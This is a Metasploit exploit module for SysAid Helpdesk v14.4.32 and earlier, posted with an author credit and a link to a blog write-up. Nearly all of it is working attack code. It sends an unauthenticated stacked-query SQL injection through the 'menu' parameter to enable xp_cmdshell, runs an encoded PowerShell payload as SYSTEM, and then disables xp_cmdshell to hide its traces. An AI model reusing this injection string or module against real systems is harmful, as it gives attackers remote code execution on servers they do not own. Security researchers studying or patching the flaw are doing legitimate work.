# Date: 28.11.2015
# Exploit Author: hland
# Vendor Homepage: https://www.sysaid.com/
# Version: v14.4.32 b25
# Tested on: Windows 7, Windows 10
# Blog post: http://blog.blankhat.pw/2015/09/unauthenticated-sql-injection-in-sysaid.html
 
 
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;msf/core/exploit/powershell&#039;
require &#039;msf/core/exploit/mssql_commands&#039;
 
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::HttpClient
 
 
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Sysaid Helpdesk Software Unauthenticated SQLi",
      &#039;Description&#039;    => %q{
        This module exploits an unauthenticated SQLi vulnerability in the Sysaid 
        Helpdesk Free software. Because the "menu" parameter is not handled correctly,
        a malicious user can manipulate the SQL query, and allows
        arbitrary code execution under the context of &#039;SYSTEM&#039; because the database
        runs as the SA user. This module uses a Metasploit generated Powershell payload and
    uses xp_cmdshell, which is activated and then deactivated after exploitation.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Hland&#039;, 
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;xxxx&#039;],
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00"
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;Sysaid Helpdesk <= v14.4.32 b25&#039;, {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Aug 29 2015",
      &#039;DefaultTarget&#039;  => 0,
 
))
 
      register_options(
        [
          OptPort.new(&#039;RPORT&#039;,     [true, "The web application&#039;s port", 8080]),
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to to the web application&#039;, &#039;/&#039;])
        ], self.class)
  end
 
  def check
 
    peer = "#{rhost}:#{rport}"
    uri = target_uri.path
    uri = normalize_uri(uri,"Login.jsp")
 
    print_status("#{peer} - Checking for vulnerability")
 
    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => uri,
      &#039;vars_get&#039; => {
      }
    })
 
    v = res.body.scan(/\<title\>SysAid Help Desk Software\<\/title\>/)
    if not v
        vprint_error("Is this even a Sysaid Help Desk?")
        return Exploit::CheckCode::Safe
    else
        vprint_status("Identified system as Sysaid Help Desk")
    return Exploit::CheckCode::Appears
 
    end
 
    return Exploit::CheckCode::Unknown
 
  end
 
  def mssql_xpcmdshell(cmd,doprint=false,opts={})
    force_enable = false
    begin
      res = mssql_query("EXEC master..xp_cmdshell &#039;#{cmd}&#039;", doprint)
      #mssql_print_reply(res) if doprint
 
      return res
 
    rescue RuntimeError => e
      if(e.to_s =~ /xp_cmdshell disabled/)
        force_enable = true
        retry
      end
      raise e
    end
  end
 
  def exploit
    peer = "#{rhost}:#{rport}"
    uri = target_uri.path
 
    vprint_line("#{peer} - Getting a session token...")
     
    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(uri, "Login.jsp"),
      &#039;vars_get&#039; => {
      }
    })
 
    vprint_line("#{peer} - Cookie&#039;s in the jar...")
 
    # Got a cookie, now ready to make exploiting requests
    if res && res.code == 200
        #vprint_line("#{res.headers}")
        cookies = res.get_cookies
        #vprint_line("#{cmd_psh_payload(payload.encoded, payload_instance.arch.first)}")
    else
        vprint_line("No 200 response? I&#039;m outta here")
        return
 
    end
 
    # Put together the vulnerable URI
    uri = normalize_uri(uri,"api","v1","menu","menu_items")
 
    # Generate powershell payload as an encoded string
    powershell_payload = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {:encode_final_payload => true, :remove_comspec => true})
 
     
 
    #
    # Inject payload and wait for shell
    #
    print_status("#{peer} - Trying to activate xp_cmdshell and exploit vulnerability")
 
    sqli = "main&#039;;exec master.dbo.sp_configure &#039;show advanced options&#039;,1;RECONFIGURE;exec master.dbo.sp_configure &#039;xp_cmdshell&#039;, 1;RECONFIGURE;EXEC master..xp_cmdshell &#039;#{powershell_payload}&#039;;--"
    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => uri,
      &#039;cookie&#039;    => cookies,
      &#039;vars_get&#039; => {
        &#039;menu&#039; => sqli,
      }
    })
 
 
    # Deactivate XPCmdShell
    sqli = "main&#039;;exec sp_configure &#039;xp_cmdshell&#039;, 0 ;RECONFIGURE;exec sp_configure &#039;show advanced options&#039;, 0 ;RECONFIGURE;--"
    print_status("#{peer} - Deactivating xp_cmdshell to clean up after ourselves..")
 
    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => uri,
      &#039;cookie&#039;    => cookies,
      &#039;vars_get&#039; => {
        &#039;menu&#039; => sqli,
      }
    })
 
  end
end

